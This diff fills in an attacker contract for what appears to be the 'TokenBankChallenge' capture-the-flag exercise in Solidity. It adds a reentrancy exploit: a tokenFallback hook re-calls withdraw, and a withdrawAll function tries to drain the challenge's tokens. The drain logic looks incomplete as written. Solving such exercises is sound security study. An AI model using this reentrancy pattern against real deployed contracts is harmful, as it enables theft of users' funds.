@@ -130,11 +130,30 @@ contract TokenBankChallenge {
 }
 
 // Write your exploit contract below
-contract TokenBankAttacker {
+contract TokenBankAttacker is ITokenReceiver {
     TokenBankChallenge public challenge;
+    bool private done;
 
     constructor(address challengeAddress) {
         challenge = TokenBankChallenge(challengeAddress);
+        done = false;
     }
     // Write your exploit functions here
+
+    function tokenFallback(
+        address from,
+        uint256 value,
+        bytes memory data
+    ) external {
+        if (from == address(challenge) && !done) {
+            done = true;
+            challenge.withdraw(1);
+        }
+    }
+
+    function withdrawAll() external {
+        challenge.token().transfer(address(challenge), 1);
+        challenge.withdraw(1);
+        challenge.withdraw(challenge.token().balanceOf(address(challenge)));
+    }
 }
